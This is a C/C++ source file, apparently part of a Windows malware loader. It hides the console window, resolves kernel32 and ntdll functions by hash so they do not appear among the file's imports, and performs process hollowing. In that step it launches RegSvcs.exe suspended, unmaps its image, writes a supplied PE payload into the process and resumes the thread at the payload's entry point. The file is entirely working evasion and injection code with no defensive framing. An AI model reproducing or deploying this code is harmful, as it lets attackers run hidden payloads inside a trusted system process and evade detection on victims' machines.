#include "Import.h"

// ebanaya hyenya xz zahem ona xd
DWORD HashString(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}

// fun hide api hech
FARPROC GetAPIByHash(HMODULE hModule, DWORD hash) {
    char* baseAddr = (char*)hModule;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddr + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* funcNames = (DWORD*)(baseAddr + exportDir->AddressOfNames);
    WORD* nameOrdinals = (WORD*)(baseAddr + exportDir->AddressOfNameOrdinals);
    DWORD* funcAddresses = (DWORD*)(baseAddr + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* funcName = baseAddr + funcNames[i];
        if (HashString(funcName) == hash) {
            return (FARPROC)(baseAddr + funcAddresses[nameOrdinals[i]]);
        }
    }
    return NULL;
}

HMODULE GetKernel32() {
    return GetModuleHandleA("kernel32.dll");
}

HWND GetConsoleWindowHidden() {
    HMODULE hKernel32 = GetKernel32();
    if (hKernel32) {
        FARPROC pGetConsoleWindow = GetAPIByHash(hKernel32, HashString("GetConsoleWindow"));
        if (pGetConsoleWindow) {
            return ((HWND(WINAPI*)())pGetConsoleWindow)();
        }
    }
    return NULL;
}

BOOL ShowWindowHidden(HWND hWnd, int nCmdShow) {
    HMODULE hKernel32 = GetKernel32();
    if (hKernel32) {
        FARPROC pShowWindow = GetAPIByHash(hKernel32, HashString("ShowWindow"));
        if (pShowWindow) {
            return ((BOOL(WINAPI*)(HWND, int))pShowWindow)(hWnd, nCmdShow);
        }
    }
    return FALSE;
}

BOOL FreeConsoleHidden() {
    HMODULE hKernel32 = GetKernel32();
    if (hKernel32) {
        FARPROC pFreeConsole = GetAPIByHash(hKernel32, HashString("FreeConsole"));
        if (pFreeConsole) {
            return ((BOOL(WINAPI*)())pFreeConsole)();
        }
    }
    return FALSE;
}

void HideConsole() {
    HWND hWnd = GetConsoleWindowHidden();
    if (hWnd != nullptr) {
        ShowWindowHidden(hWnd, SW_HIDE);
    }
    FreeConsoleHidden();
}

// load hide api and hech
bool LoadHiddenAPI(HiddenAPI* api) {
    HMODULE hKernel32 = GetKernel32();
    if (!hKernel32) return false;

    api->CreateProcessA = (pCreateProcessA)GetAPIByHash(hKernel32, HashString("CreateProcessA"));
    api->GetThreadContext = (pGetThreadContext)GetAPIByHash(hKernel32, HashString("GetThreadContext"));
    api->SetThreadContext = (pSetThreadContext)GetAPIByHash(hKernel32, HashString("SetThreadContext"));
    api->ReadProcessMemory = (pReadProcessMemory)GetAPIByHash(hKernel32, HashString("ReadProcessMemory"));
    api->WriteProcessMemory = (pWriteProcessMemory)GetAPIByHash(hKernel32, HashString("WriteProcessMemory"));
    api->VirtualAllocEx = (pVirtualAllocEx)GetAPIByHash(hKernel32, HashString("VirtualAllocEx"));
    api->VirtualAlloc = (pVirtualAlloc)GetAPIByHash(hKernel32, HashString("VirtualAlloc"));
    api->ResumeThread = (pResumeThread)GetAPIByHash(hKernel32, HashString("ResumeThread"));

    return (api->CreateProcessA && api->GetThreadContext && api->SetThreadContext &&
        api->ReadProcessMemory && api->WriteProcessMemory &&
        api->VirtualAllocEx && api->VirtualAlloc && api->ResumeThread);
}

// loadpe C#
void ExecDotNetAssemblyFromMemory(LPVOID pFile, size_t fileSize, HiddenAPI* api) {
    PIMAGE_DOS_HEADER IDH;
    PIMAGE_NT_HEADERS INH;
    PIMAGE_SECTION_HEADER ISH;
    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    CONTEXT CTX;
    PDWORD dwImageBase;
    pNtUnmapViewOfSection xNtUnmapViewOfSection;

    RtlZeroMemory(&SI, sizeof(SI));
    RtlZeroMemory(&PI, sizeof(PI));
    SI.cb = sizeof(SI);

    if (!api->CreateProcessA("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
        return;
    }

    IDH = (PIMAGE_DOS_HEADER)pFile;
    if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
        INH = (PIMAGE_NT_HEADERS)((BYTE*)pFile + IDH->e_lfanew);
        if (INH->Signature == IMAGE_NT_SIGNATURE) {
            CTX.ContextFlags = CONTEXT_FULL;
            if (api->GetThreadContext(PI.hThread, &CTX)) {
                SIZE_T bytesRead = 0;
                api->ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX.Ebx + 8), &dwImageBase, sizeof(dwImageBase), &bytesRead);

                xNtUnmapViewOfSection = (pNtUnmapViewOfSection)GetAPIByHash(GetModuleHandleA("ntdll.dll"), HashString("NtUnmapViewOfSection"));
                if (xNtUnmapViewOfSection) {
                    xNtUnmapViewOfSection(PI.hProcess, (PVOID)dwImageBase);
                }

                LPVOID pImageBase = api->VirtualAllocEx(PI.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (pImageBase) {
                    SIZE_T bytesWritten = 0;
                    api->WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, &bytesWritten);
                    for (int count = 0; count < INH->FileHeader.NumberOfSections; count++) {
                        ISH = (PIMAGE_SECTION_HEADER)((BYTE*)pFile + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (count * sizeof(IMAGE_SECTION_HEADER)));
                        api->WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)pImageBase + ISH->VirtualAddress), (LPVOID)((DWORD)pFile + ISH->PointerToRawData), ISH->SizeOfRawData, &bytesWritten);
                    }
                    api->WriteProcessMemory(PI.hProcess, (LPVOID)(CTX.Ebx + 8), &INH->OptionalHeader.ImageBase, sizeof(INH->OptionalHeader.ImageBase), &bytesWritten);
                    CTX.Eax = (DWORD)pImageBase + INH->OptionalHeader.AddressOfEntryPoint;
                    api->SetThreadContext(PI.hThread, &CTX);
                    api->ResumeThread(PI.hThread);
                }
                else {
                    TerminateProcess(PI.hProcess, 1);
                }
            }
            else {
                TerminateProcess(PI.hProcess, 1);
            }
        }
    }
    CloseHandle(PI.hThread);
    CloseHandle(PI.hProcess);
}
